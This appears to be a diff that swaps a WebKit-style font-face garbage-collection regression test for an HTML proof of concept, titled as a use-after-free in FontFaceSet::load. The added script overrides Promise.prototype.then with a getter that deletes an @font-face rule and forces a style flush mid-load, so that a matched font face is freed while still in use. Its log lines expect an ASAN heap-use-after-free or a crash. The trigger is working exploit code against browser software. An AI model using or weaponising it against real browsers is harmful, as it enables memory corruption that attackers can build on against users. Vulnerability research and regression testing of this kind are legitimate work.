@@ -1,37 +1,76 @@
 <html>
 <head>
-<script src="../../resources/gc.js"></script>
-<script>
-if (window.testRunner) {
-    testRunner.dumpAsText();
-    testRunner.waitUntilDone();
+<meta charset="utf-8">
+<title>PoC #1 — FontFaceSet::load matchingFaces UAF</title>
+<style id="sheet">
+@font-face {
+    font-family: 'UafFamily';
+    font-weight: 400;
+    src: local('Arial'), local('Helvetica'), local('sans-serif');
+    unicode-range: U+0041-005A;
 }
-
-function load()
-{
-    style = document.createElement('style');
-    style.textContent = '@font-face { font-family: "A"; }';
-    document.head.appendChild(style);
-    rulestyle = document.styleSheets[0].cssRules[0].style;
-    document.head.removeChild(style);
-    style = null;
-    setTimeout(crash, 0);
+@font-face {
+    font-family: 'UafFamily';
+    font-weight: 700;
+    src: url('data:font/woff2;base64,d09GMgABAAAAAAIAAA==') format('woff2');
+    unicode-range: U+0061-007A;
 }
-
-function crash()
-{
-    gc();
-    obj = rulestyle.parentRule;
-    // If the gc() actually successfully reaps everything it can, then obj
-    // will end up null (post-fix). gc() is not guaranteed to reap the font-face
-    // rule, however, particularly in the browser context.
-    if (obj)
-        obj = obj.foo;
-    document.body.innerText = 'PASS';
-    if (window.testRunner)
-        testRunner.notifyDone()
-}
-</script>
+</style>
 </head>
-<body onload="load()"></body>
-</html>
+<body>
+<pre id="log"></pre>
+<script>
+const L = s => { document.getElementById('log').textContent += s + '\n'; };
+const sheet = document.getElementById('sheet').sheet;
+
+// Force initial style resolution: makes both faces CSS-connected
+document.body.getBoundingClientRect();
+L('[+] Two @font-face rules registered, both CSS-connected');
+
+// ---- Install same-stack thenable getter ----
+// JSC resolvePromise() does: then = resolution.then  (synchronous, observable)
+// This fires during FontFaceSet::completedLoading() -> m_readyPromise->resolve()
+// which is called from CSSFontFace::setStatus(Success) inside FontFaceSet::load().
+const orig = Object.getOwnPropertyDescriptor(Promise.prototype, 'then');
+let armed = false;
+
+Object.defineProperty(Promise.prototype, 'then', {
+    configurable: true,
+    get() {
+        if (armed) {
+            armed = false;
+            L('[+] then getter fired (same stack as FontFaceSet::load)');
+
+            // Step 1: schedule style rebuild by deleting the first @font-face rule
+            try { sheet.deleteRule(0); L('[+] deleteRule(0) done'); }
+            catch(e) { L('[!] deleteRule: ' + e); }
+
+            // Step 2: force immediate flush
+            // Document::updateStyleIfNeeded -> Style::Scope::updateActiveStyleSheets
+            // -> CSSFontSelector::buildCompleted -> CSSFontFaceSet::remove(face[0])
+            // face[0] refcount -> 0 -> freed.  matchingFaces[0] now dangling.
+            document.body.getBoundingClientRect();
+            L('[+] getBoundingClientRect() flushed style. face[0] may be freed.');
+
+            // Step 3: restore so promise machinery doesn't get stuck
+            Object.defineProperty(Promise.prototype, 'then', orig);
+        }
+        return orig.value;
+    }
+});
+
+L('[+] Calling document.fonts.load (text "Aa" -> two matched faces)');
+armed = true;
+
+document.fonts.load('400 16px UafFamily', 'Aa').then(faces => {
+    L('[+] load() resolved, faces: ' + faces.length);
+    L('[+] If ASAN is active and build is vulnerable, you saw heap-use-after-free above.');
+    L('[+] If no ASAN: silent corruption or crash in FontFaceSet::load() post-loop.');
+}).catch(e => {
+    L('[!] load() rejected: ' + e);
+});
+
+L('[+] document.fonts.load() called (synchronous path may have already triggered getter)');
+</script>
+</body>
+</html> 
